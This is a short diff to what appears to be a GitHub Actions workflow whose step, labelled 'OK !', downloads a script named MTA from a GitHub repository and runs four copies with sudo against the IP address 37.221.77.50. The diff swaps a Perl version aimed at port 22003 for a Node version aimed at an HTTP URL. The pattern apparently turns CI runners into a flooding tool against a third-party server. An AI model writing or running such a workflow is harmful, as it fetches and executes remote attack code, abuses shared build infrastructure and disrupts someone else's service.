@@ -13,11 +13,11 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://github.com/ahmetdonmmzz001/Discord/raw/refs/heads/main/MTA.pl -O MTA.pl
-          chmod +x MTA.pl
+          wget https://github.com/ahmetdonmmzz001/Discord/raw/refs/heads/main/MTA.js -O MTA.js
+          chmod +x MTA.js
           PIDS=()
           for i in {1..4}; do
-            sudo timeout 30 perl MTA.pl 37.221.77.50 22003 &
+            sudo timeout 30 node MTA.js http://37.221.77.50 30 &
             PIDS+=($!)
           done
           
